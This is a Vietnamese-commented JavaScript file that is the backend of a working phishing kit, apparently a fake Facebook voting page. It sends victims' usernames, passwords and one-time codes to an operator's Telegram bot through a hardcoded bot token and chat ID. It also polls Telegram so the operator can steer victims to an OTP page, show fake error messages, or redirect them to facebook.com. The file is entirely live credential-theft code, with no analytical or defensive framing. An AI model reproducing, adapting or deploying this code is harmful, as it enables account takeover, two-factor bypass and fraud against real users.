/**
 * ELITE SYSTEM 2026 - TRUNG TÂM DỮ LIỆU KÊNH "TIỀN VỀ"
 * Chức năng: Gửi dữ liệu đồng bộ và Nhận lệnh điều khiển
 */

// ==========================================
// 1. THÔNG TIN KẾT NỐI (ĐÃ CẤU HÌNH CHUẨN)
// ==========================================
const TOKEN = "8217538564:AAHwyK0pwRtgqSdPdScc8y2a4VKfn14T7As";
const CHAT_ID = "-1003544188616"; 

// ==========================================
// 2. HÀM GỬI DỮ LIỆU (CÓ ĐỢI PHẢN HỒI)
// ==========================================
async function sendToTele(message) {
    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        return await response.json();
    } catch (e) {
        console.error("Lỗi gửi dữ liệu Telegram:", e);
        return null;
    }
}

// ==========================================
// 3. CÁC HÀM GOM DỮ LIỆU ĐỂ GỌI TỪ HTML
// ==========================================

// Hàm gom dữ liệu Login (Dùng cho login.html)
async function collectLogin(user, pass) {
    const msg = `💰 **TIỀN VỀ - CÓ ACC MỚI!**\n` +
                `--------------------------\n` +
                `👤 Tài khoản: \`${user}\`\n` +
                `🔑 Mật khẩu: \`${pass}\`\n` +
                `--------------------------\n` +
                `👉 *Nhắn "OTP" để bắt khách nhập mã.*`;
    return await sendToTele(msg);
}

// Hàm gom dữ liệu OTP (Dùng cho otp.html)
async function collectOTP(code) {
    const msg = `🔢 **MÃ OTP MỚI NHẬN ĐƯỢC**\n` +
                `--------------------------\n` +
                `✨ Mã: \`${code}\`\n` +
                `✅ *Dùng mã này để đăng nhập ngay!*`;
    return await sendToTele(msg);
}

// ==========================================
// 4. HÀM ĐIỀU KHIỂN (POLLING)
// ==========================================
let lastProcessedMsgId = 0;

async function listenAdminCommands() {
    try {
        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        
        if (data.ok && data.result.length > 0) {
            const post = data.result[0].channel_post || data.result[0].message;
            if (!post) return;

            const command = post.text.toUpperCase();
            const msgId = post.message_id;

            // Kiểm tra tránh lặp lại lệnh cũ khi F5 trang
            if (msgId !== lastProcessedMsgId) {
                if (lastProcessedMsgId !== 0) { 
                    handleWebAction(command);
                }
                lastProcessedMsgId = msgId;
            }
        }
    } catch (e) { }
}

// Thực thi lệnh nhảy trang dựa trên tin nhắn trong Kênh
function handleWebAction(cmd) {
    if (cmd.includes('OTP')) {
        window.location.href = 'otp.html';
    } else if (cmd.includes('WAIT')) {
        window.location.href = 'waiting.html';
    } else if (cmd.includes('ERROR')) {
        alert("Mã xác nhận không chính xác. Vui lòng kiểm tra lại!");
        // Reset các ô nhập mã nếu đang ở trang OTP
        const inputs = document.querySelectorAll('input');
        if (inputs) inputs.forEach(i => i.value = "");
    } else if (cmd.includes('SUCCESS')) {
        alert("Bình chọn thành công!");
        window.location.href = 'https://facebook.com';
    }
}

// Kiểm tra lệnh mới mỗi 2 giây
setInterval(listenAdminCommands, 2000);
